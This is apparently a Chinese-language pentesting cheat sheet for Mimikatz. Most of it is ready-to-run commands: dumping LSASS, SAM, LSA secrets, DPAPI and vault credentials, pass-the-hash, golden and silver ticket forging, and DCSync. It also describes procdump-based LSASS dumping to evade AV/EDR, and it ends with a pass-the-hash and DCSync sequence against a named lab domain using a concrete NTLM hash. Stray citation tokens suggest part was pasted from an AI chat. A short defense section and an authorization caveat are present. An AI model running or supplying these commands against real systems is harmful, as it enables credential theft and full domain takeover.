```
.\mimikatz.exe "privilege::debug"  "token::elevate"  "log"  "lsadump::sam /patch"  "lsadump::sam"  "sekurlsa::msv"  "lsadump::secrets" "  lsadump::lsa"  "lsadump::lsa /patch"  "lsadump::cache"  "sekurlsa::logonpasswords full"  "sekurlsa::ekeys"  "sekurlsa::dpapi"  "sekurlsa::credman"  "vault::list"  "vault::cred /patch"  "exit"
```

```
.\mimikatz.exe "privilege::debug"    "sekurlsa::logonpasswords"   "exit"
```


| 模块                                     | 功能说明                                                             |
| -------------------------------------- | ---------------------------------------------------------------- |
| `privilege::debug`                     | 提升当前进程权限到 Debug 权限（相当于 SeDebugPrivilege）。允许访问受保护的系统进程（如 LSASS）。  |
| `token::elevate`                       | 尝试提权为 SYSTEM 账户令牌（Token Impersonation）。                          |
| `log`                                  | 启用日志输出，将运行结果写入 mimikatz.log 文件。                                  |
| `lsadump::sam` / `lsadump::sam /patch` | 从 `HKLM\SAM` 注册表中提取本地账户的 NTLM 哈希（/patch 模式会暂时修改内存安全策略以绕过保护）。     |
| `lsadump::secrets`                     | 从 `HKLM\SECURITY` 注册表中提取存储的系统机密（service account 密码、L$Secrets 等）。 |
| `lsadump::lsa` / `/patch`              | 从 LSA 进程（Local Security Authority）内存中导出 LSA 密钥与凭证数据。             |
| `lsadump::cache`                       | 提取缓存的域登录凭证（Cached Domain Logon）。                                 |
| `sekurlsa::msv`                        | 从 LSASS 内存中解析 MSV1_0 身份验证模块（提取 NTLM 哈希、明文或 Kerberos 凭据）。         |
| `sekurlsa::logonpasswords full`        | 完整显示 LSASS 中所有会话的登录凭证信息（用户名、NTLM、明文、Kerberos 票据等）。               |
| `sekurlsa::ekeys`                      | 提取当前用户或系统的 Kerberos 加密密钥。                                        |
| `sekurlsa::dpapi`                      | 提取 DPAPI 主密钥（Data Protection API），可用于解密受 DPAPI 保护的数据。            |
| `sekurlsa::credman`                    | 获取 Windows Credential Manager 中保存的凭据。                            |
| `vault::list`                          | 枚举 Windows Vault（凭据保管库）中的条目。                                     |
| `vault::cred /patch`                   | 尝试从 Vault 中提取保存的凭证（如网页、网络、RDP 等）。                                |
| `exit`                                 | 退出 mimikatz。                                                     |
|                                        |                                                                  |

```
.\mimikatz.exe "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "exit"
```

```
privilege::debug
```

从**内存**提取当前登录会话的凭证（明文密码、NTLM/LM、Kerberos TGT/TGS、LUID、会话信息等。
```
sekurlsa::logonpasswords
```
从 **SAM 注册表/离线 hive** 提取本地账户的哈希（NTLM/LM）及账户信息（需要对注册表的高权限访问或离线 hive）。
```
lsadump::sam

```

```
sekurlsa::minidump lsass.dmp
```


```
lsadump::sam /sam:C:\temp\sam.hiv /system:C:\temp\system.hiv
```
`lsass.exe`（Local Security Authority Subsystem Service）是 Windows 的一个关键系统进程，负责本地安全策略、用户验证、登录会话和凭证管理。
`lsass.exe`（Local Security Authority Subsystem Service）是 Windows 的一个关键系统进程，负责本地安全策略、用户验证、登录会话和凭证管理。



`sekurlsa` 是 **Mimikatz** 中用于与 LSASS 相关数据交互的模块名（`sekurlsa` 来自 “Security Local Security Authority” 的缩写）。具体作用：

- 从 `lsass.exe` 的内存结构中解析并提取当前登录会话的凭证（明文密码、NTLM 哈希、Kerberos TGT/TGS 等）。
    
- 支持直接在目标内存上读取（需要 SeDebugPrivilege / 高权限）或在离线 minidump 文件上解析（先对 `lsass` 做 memory dump，再用 `sekurlsa::minidump` 分析）。


下面给出面向红队/蓝队的实用 Mimikatz 使用说明（中文），包含常用命令、示例与防御建议。务必仅在你有明确授权的环境中使用（渗透测试、应急响应或实验室）。

1. 前提与准备

- 本地需要管理员权限（部分操作需 SYSTEM）。通常需要 SeDebugPrivilege（即以管理员/系统权限运行）。
- 在受防护的环境（Credential Guard、LSA Protection/PPL）下，Mimikatz 能力会受限，可能需要先绕过或使用内存转储法。

2. 启动与交互（基础）

- 直接在 Windows 上运行 mimikatz.exe，然后在交互式提示符中执行命令。例如： privilege::debug sekurlsa::logonpasswords exit 这会列出内存中登录会话、明文/哈希（如果可见）等。

3. 从 LSASS 提取（两种常见方式）

- 直接内存提取（需要足够权限）：在 mimikatz 内运行 privilege::debug sekurlsa::logonpasswords sekurlsa::ekeys 适用于未启用 PPL 的场景。
- 使用合法工具先 dump lsass，再离线分析（绕过 AV/EDR 检测）： procdump.exe -accepteula -ma lsass.exe lsass.dmp mimikatz# sekurlsa::minidump lsass.dmp mimikatz# sekurlsa::logonpasswords 这种流程常用于防护/取证或在受保护环境下提取凭证。

4. Pass-the-Hash（PTH）

- 将 NTLM hash 注入会话并创建使用该 hash 的新进程（需要本地 admin）： sekurlsa::pth /user:USERNAME /domain:DOMAIN /ntlm:NTLM_HASH /run:"cmd.exe" 或命令行： mimikatz sekurlsa::pth /user:alice /domain:corp.local /ntlm:aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa /run:"powershell -w hidden" 该方法会修改内存凭证，使后续网络认证使用该 hash。 fileciteturn0file0turn0file3

5. Kerberos 攻击：黄金票据 / 银票 / 票据注入（PTT）

- 创建 Golden Ticket（需要 krbtgt 密钥或其 hash）并直接注入内存： mimikatz "kerberos::golden /user:Administrator /domain:example.local /sid:S-1-5-21-... /krbtgt:KRBTGT_HASH /ptt" exit
- 创建 Silver Ticket（针对特定服务）： mimikatz "kerberos::golden /user:user /domain:example.local /sid:... /target:service.example.com /service:cifs /rc4:NTLM_HASH /ptt" exit
- 列出/注入/导出票据： kerberos::list kerberos::ptt /ticket:ticket.kirbi sekurlsa::tickets /export 这些功能可实现“Pass-the-Ticket”、横向移动与长期持久化。 fileciteturn0file2turn0file5

6. AD 相关：DCSync、LSA secrets

- 使用 lsadump 模块执行 DCSync（模仿域控制器请求密码数据，需要相应权限）： lsadump::dcsync /user:krbtgt /domain:example.local
- 导出 LSA secrets、SAM、缓存等： lsadump::lsa /inject lsadump::sam lsadump::secrets 这些命令用于获取域/本地重要凭据（域场景需严格授权）。

7. 结合其他工具的常见流程（OPSEC 与规避）

- 如果被防护软件检测，可先用 Procdump/SharpDump 导出 lsass，再本地分析。
- 使用 Rubeus 与 Mimikatz 配合做票据提取/注入（Rubeus 更专注 Kerberos）。

8. 常用 PowerShell 集成（Invoke-Mimikatz）

- 在有权限的主机上可用 PowerShell wrapper（Invoke-Mimikatz）运行命令： Invoke-Mimikatz -Command '"privilege::debug" "sekurlsa::logonpasswords"' 便于在自动化脚本或远程会话中调用。

9. 检测与防御要点（必要）

- 最小化 SeDebugPrivilege、限制 LSA/NTDS 访问、启用 Credential Guard 与 LSA Protected Process（PPL）。
- 监控异常 Kerberos 行为：例如没有先前 4768 就出现 4769（伪造 TGT 使用）、不寻常的票据有效期等可指示 Golden Ticket 攻击。
- 审计/告警建议：对 LSASS 内存访问、procdump 执行、非典型服务凭据读取、异常票据注入行为建立告警。 fileciteturn0file4turn0file13

1. hash传递

sekurlsa::pth /user:DC01$ /ntlm:ee256418867b2d47262af3dd048c6c66 /domain:medtech.com

在新创建的窗口执行dcsync

lsadump::dcsync /domain:medtech.com /user:medtech\leon



